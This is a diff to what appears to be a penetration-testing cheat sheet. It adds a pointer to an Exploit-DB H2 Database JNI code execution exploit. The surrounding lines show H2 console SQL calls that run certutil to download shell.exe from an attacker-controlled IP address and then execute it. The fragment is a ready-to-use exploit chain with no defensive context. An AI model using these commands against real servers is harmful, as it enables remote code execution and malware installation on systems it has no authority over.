@@ -908,6 +908,9 @@ sed 's/\xe2\x80\x8b//g' inputfile
 ```
 # Java h2 console
 ```bash
+Need to follow the steps here ---> https://www.exploit-db.com/exploits/49384
+# Exploit Title: H2 Database 1.4.199 - JNI Code Execution
+
 CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("certutil -urlcache -f http://192.168.49.156/shell.exe C:\\Users\\Tony\\Desktop\\shell.exe").getInputStream()).useDelimiter("\\Z").next()');
 CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("C:\\Users\\Tony\\Desktop\\shell.exe").getInputStream()).useDelimiter("\\Z").next()');
 # CHINESE
